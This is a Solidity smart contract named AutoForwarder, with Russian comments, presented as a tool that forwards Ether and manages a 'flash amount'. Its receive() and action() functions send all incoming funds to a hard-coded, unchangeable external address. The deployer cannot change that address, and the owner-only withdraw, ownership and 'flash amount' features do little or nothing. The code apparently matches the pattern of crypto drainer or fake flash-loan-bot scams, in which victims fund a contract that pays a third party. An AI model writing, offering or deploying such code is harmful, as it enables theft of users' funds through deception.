// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title AutoForwarder
/// @notice Этот контракт автоматически пересылает полученный эфир на заранее определенный адрес.
/// @dev Адрес назначения жестко задан и неизменяем. Контракт включает функциональность установки и обновления суммы "flash amount", а также механизмы контроля доступа для обеспечения безопасности.
contract AutoForwarder {
    /// @notice Адрес, на который будет пересылаться весь полученный эфир.
    /// @dev Этот адрес жестко задан и не может быть изменен после развертывания.
    address payable public constant destinationAddress = payable(0x706F5710D045AE9067F37aECA26A971341E8dA26);

    /// @notice Владелец контракта.
    /// @dev Владелец устанавливается при развертывании контракта и может передать права собственности.
    address public owner;

    /// @notice Сумма "flash amount", указанная при развертывании.
    /// @dev Эта сумма может быть обновлена владельцем после развертывания.
    uint256 public flashAmount;

    /// @notice Событие для логирования действия пересылки.
    /// @param from Адрес, с которого был получен эфир.
    /// @param amount Сумма пересланного эфира.
    event Forwarded(address indexed from, uint256 amount);

    /// @notice Событие для логирования изменения суммы "flash amount".
    /// @param previousAmount Предыдущая сумма "flash amount".
    /// @param newAmount Новая сумма "flash amount".
    event FlashAmountUpdated(uint256 previousAmount, uint256 newAmount);

    /// @notice Событие для логирования передачи прав собственности.
    /// @param previousOwner Адрес предыдущего владельца.
    /// @param newOwner Адрес нового владельца.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /// @notice Модификатор для ограничения доступа к функциям только для владельца.
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    /// @notice Конструктор для установки начальной суммы "flash amount" и владельца.
    /// @param _flashAmount Начальная сумма "flash amount".
    constructor(uint256 _flashAmount) {
        flashAmount = _flashAmount;
        owner = msg.sender;
        emit OwnershipTransferred(address(0), owner);
    }

    /// @notice Функция для автоматической пересылки любого полученного эфира.
    /// @dev Эта функция вызывается, когда эфир отправляется на контракт без данных.
    receive() external payable {
        require(msg.value > 0, "No Ether received");
        emit Forwarded(msg.sender, msg.value);
        (bool success, ) = destinationAddress.call{value: msg.value}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Функция для изменения суммы "flash amount".
    /// @dev Эту функцию может вызывать только владелец.
    /// @param _newFlashAmount Новая сумма "flash amount".
    function setFlashAmount(uint256 _newFlashAmount) external onlyOwner {
        uint256 previousAmount = flashAmount;
        flashAmount = _newFlashAmount;
        emit FlashAmountUpdated(previousAmount, _newFlashAmount);
    }

    /// @notice Функция для передачи прав собственности на контракт.
    /// @dev Эту функцию может вызывать только текущий владелец.
    /// @param _newOwner Адрес нового владельца.
    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "New owner is the zero address");
        address previousOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(previousOwner, _newOwner);
    }

    /// @notice Функция для пересылки суммы "flash amount" эфира с использованием вызова call.
    /// @dev Эту функцию может вызывать любой пользователь. Баланс контракта должен быть не меньше `flashAmount`.
    function action() external {
        require(address(this).balance >= flashAmount, "Insufficient contract balance");
        emit Forwarded(address(this), flashAmount);
        (bool success, ) = destinationAddress.call{value: flashAmount}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Функция для вывода любого эфира, находящегося на балансе контракта, на адрес владельца.
    /// @dev Эту функцию может вызывать только владелец.
    function withdraw() external onlyOwner {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No Ether to withdraw");
        (bool success, ) = owner.call{value: contractBalance}("");
        require(success, "Withdrawal failed");
    }

    /// @notice Функция для уничтожения контракта и отправки оставшегося эфира владельцу.
    /// @dev Эту функцию может вызывать только владелец. Используйте с осторожностью.
    function destroy() external onlyOwner {
        selfdestruct(payable(owner));
    }
}
